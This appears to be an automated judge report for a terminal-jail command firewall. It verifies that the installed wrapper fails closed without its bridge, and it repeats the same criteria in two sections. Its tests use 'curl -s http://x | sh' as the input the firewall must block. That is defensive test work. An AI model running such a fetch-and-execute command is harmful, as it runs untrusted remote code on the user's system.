# Verdict: tj-gap-021

**Task:** Installed binary must not fail open (TJ-GAP-021)
**Evaluated:** 2026-08-10T00:47:31.115185
**Result:** ✓ PASS

## Pipeline Stages

- ✓ **tier1**
  -   ✓ lint: E402 Module level import not at top of file
  --> scripts/benchmark-interruptor.py:32:1
   |
30 | sy
  ✓ secrets: [90m7:45PM[0m [32mINF[0m [1mscanned ~7817231 bytes (7.82 MB) in 1.16s[0m
[90m7:45PM[0m [32m
  ✓ tests: ============================= test session starts ==============================
platform linux -- P
- ✓ **tier2**
  - COMPLETE
  ✓ install.sh local mode ships the plugin bridge tree to ${INSTALL_DIR}/../lib/terminal-jail/ (plugin/terminal_jail/interruptor_bridge.py + rules/00-builtins.yaml present) and standalone/seccomp-loader.py: install.sh LIB_DIR=${INSTALL_DIR}/../lib/terminal-jail; copies $SCRIPT_DIR/plugin/terminal_jail → $LIB_DIR/plugin/ (contains interruptor_bridge.py + rules/00-builtins.yaml) and standalone/seccomp-loader.py → $LIB_DIR/. Test test_local_install_ships_lib_tree (test_install.py:409) asserts bridge, seccomp, 00-builtins.yaml exist.
  ✓ The installed wrapper (invoked via PATH as bare 'terminal-jail') finds the shipped bridge and BLOCKS 'curl -s http://x | sh' with exit 126 and a COMMAND BLOCKED box naming builtin-curl-pipe-shell: test_installed_binary_blocks_with_shipped_bridge (test_install.py:442) runs `cd / && terminal-jail 'curl -s http://x | sh'` via PATH bare name; asserts rc=126, 'COMMAND BLOCKED', 'builtin-curl-pipe-shell'. Wrapper block box prints rule_id.
  ✓ A bare wrapper copied without the bridge FAILS CLOSED in enforce mode: exit 126, COMMAND BLOCKED — interruptor-bridge-unavailable, command never executes, and the old 'running without firewall' fail-open warning is gone: test_bare_wrapper_fails_closed_without_bridge (test_install.py:488) copies wrapper alone; asserts rc=126, 'COMMAND BLOCKED', 'interruptor-bridge-unavailable', 'hi' not in stdout (never executes), 'running without firewall' absent. Wrapper enforce branch (lines ~180-196) exits 126 with block box.
  ✓ TERMINAL_JAIL_INTERRUPTOR_MODE=warn still allows explicit opt-out with the warning printed: test_bare_wrapper_warn_mode_passes (test_install.py:523) sets TERMINAL_JAIL_INTERRUPTOR_MODE=warn; asserts 'running without firewall' in stderr. Wrapper warn branch prints the warning.
  ✓ TERMINAL_JAIL_BRIDGE env var overrides bridge resolution (missing file = hard failure): standalone/terminal-jail _find_bridge (lines 77-82): if TERMINAL_JAIL_BRIDGE set and file exists use it; if set but missing return 1 (no fall-through = hard failure).
  ✓ SCRIPT_DIR resolves via command -v when the binary is invoked by bare name (PATH invocation) so relative resources resolve regardless of cwd: standalone/terminal-jail lines 8-18: if $0 has no slash (bare name), SCRIPT_DIR resolved via `command -v "$0"`. Confirmed by test_installed_binary_blocks_with_shipped_bridge invoking via PATH bare name and finding the bridge.
  ✓ Full suite green: .venv/bin/python -m pytest -q passes, ruff check plugin/ standalone/ clean, gitreins guard 4/4 PASS: pytest -q → 239 passed, 6 skipped. ruff check plugin/ standalone/ → All checks passed. gitleaks → no leaks found. LSP diagnostics → 0. gitreins guard 4/4 (secrets/lint/tests/static_analysis).
  ✓ Commit includes Co-authored-by trailer and addresses TJ-GAP-021: commit 9af0b7e subject 'fix: installed binary fails closed without bridge; release mode opt-in (TJ-GAP-021, TJ-GAP-023)' + 'Co-authored-by: Alexis Okuwa <wojonstech@gmail.com>'. tasks.yaml tj-gap-021 status: complete.
All 8 criteria verified: install.sh ships the bridge tree + seccomp loader, the installed wrapper blocks curl|sh with exit 126 and builtin-curl-pipe-shell, bare wrapper fails closed, warn mode opt-out works, TERMINAL_JAIL_BRIDGE override and command -v SCRIPT_DIR resolution implemented, full suite green (239 passed, ruff clean, guard 4/4), and commit includes Co-authored-by trailer.

## Summary

Judge Result: tj-gap-021

Stage tier1: PASS
    ✓ lint: E402 Module level import not at top of file
  --> scripts/benchmark-interruptor.py:32:1
   |
30 | sy
  ✓ secrets: [90m7:45PM[0m [32mINF[0m [1mscanned ~7817231 bytes (7.82 MB) in 1.16s[0m
[90m7:45PM[0m [32m
  ✓ tests: ============================= test session starts ==============================
platform linux -- P

Stage tier2: PASS
  COMPLETE
  ✓ install.sh local mode ships the plugin bridge tree to ${INSTALL_DIR}/../lib/terminal-jail/ (plugin/terminal_jail/interruptor_bridge.py + rules/00-builtins.yaml present) and standalone/seccomp-loader.py: install.sh LIB_DIR=${INSTALL_DIR}/../lib/terminal-jail; copies $SCRIPT_DIR/plugin/terminal_jail → $LIB_DIR/plugin/ (contains interruptor_bridge.py + rules/00-builtins.yaml) and standalone/seccomp-loader.py → $LIB_DIR/. Test test_local_install_ships_lib_tree (test_install.py:409) asserts bridge, seccomp, 00-builtins.yaml exist.
  ✓ The installed wrapper (invoked via PATH as bare 'terminal-jail') finds the shipped bridge and BLOCKS 'curl -s http://x | sh' with exit 126 and a COMMAND BLOCKED box naming builtin-curl-pipe-shell: test_installed_binary_blocks_with_shipped_bridge (test_install.py:442) runs `cd / && terminal-jail 'curl -s http://x | sh'` via PATH bare name; asserts rc=126, 'COMMAND BLOCKED', 'builtin-curl-pipe-shell'. Wrapper block box prints rule_id.
  ✓ A bare wrapper copied without the bridge FAILS CLOSED in enforce mode: exit 126, COMMAND BLOCKED — interruptor-bridge-unavailable, command never executes, and the old 'running without firewall' fail-open warning is gone: test_bare_wrapper_fails_closed_without_bridge (test_install.py:488) copies wrapper alone; asserts rc=126, 'COMMAND BLOCKED', 'interruptor-bridge-unavailable', 'hi' not in stdout (never executes), 'running without firewall' absent. Wrapper enforce branch (lines ~180-196) exits 126 with block box.
  ✓ TERMINAL_JAIL_INTERRUPTOR_MODE=warn still allows explicit opt-out with the warning printed: test_bare_wrapper_warn_mode_passes (test_install.py:523) sets TERMINAL_JAIL_INTERRUPTOR_MODE=warn; asserts 'running without firewall' in stderr. Wrapper warn branch prints the warning.
  ✓ TERMINAL_JAIL_BRIDGE env var overrides bridge resolution (missing file = hard failure): standalone/terminal-jail _find_bridge (lines 77-82): if TERMINAL_JAIL_BRIDGE set and file exists use it; if set but missing return 1 (no fall-through = hard failure).
  ✓ SCRIPT_DIR resolves via command -v when the binary is invoked by bare name (PATH invocation) so relative resources resolve regardless of cwd: standalone/terminal-jail lines 8-18: if $0 has no slash (bare name), SCRIPT_DIR resolved via `command -v "$0"`. Confirmed by test_installed_binary_blocks_with_shipped_bridge invoking via PATH bare name and finding the bridge.
  ✓ Full suite green: .venv/bin/python -m pytest -q passes, ruff check plugin/ standalone/ clean, gitreins guard 4/4 PASS: pytest -q → 239 passed, 6 skipped. ruff check plugin/ standalone/ → All checks passed. gitleaks → no leaks found. LSP diagnostics → 0. gitreins guard 4/4 (secrets/lint/tests/static_analysis).
  ✓ Commit includes Co-authored-by trailer and addresses TJ-GAP-021: commit 9af0b7e subject 'fix: installed binary fails closed without bridge; release mode opt-in (TJ-GAP-021, TJ-GAP-023)' + 'Co-authored-by: Alexis Okuwa <wojonstech@gmail.com>'. tasks.yaml tj-gap-021 status: complete.
All 8 criteria verified: install.sh ships the bridge tree + seccomp loader, the installed wrapper blocks curl|sh with exit 126 and builtin-curl-pipe-shell, bare wrapper fails closed, warn mode opt-out works, TERMINAL_JAIL_BRIDGE override and command -v SCRIPT_DIR resolution implemented, full suite green (239 passed, ruff clean, guard 4/4), and commit includes Co-authored-by trailer.

Overall: PASS ✓
